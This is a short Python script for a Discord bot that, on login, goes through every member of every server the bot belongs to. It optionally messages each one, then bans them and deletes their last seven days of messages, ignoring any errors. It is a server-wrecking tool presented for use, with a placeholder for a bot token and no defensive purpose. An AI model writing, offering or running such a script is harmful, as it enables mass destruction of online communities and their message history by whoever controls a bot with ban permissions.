import discord
import asyncio
TOKEN = ""     # Put your Bot token here
SKIP_BOTS = False

client = discord.Client()

@client.event
async def on_ready():
    
    print('Logged in!')
            
    for member in list(client.get_all_members()):
        if member.bot and SKIP_BOTS:
            continue
        try:
            await client.send_message(member, "") # put optional message here
        except:
            pass
        try:
            
            await client.ban(member,delete_message_days=7)
        except:
            pass
        print(f"Banned {member.display_name}!")
    print("Banning is complete!")

client.run(TOKEN)
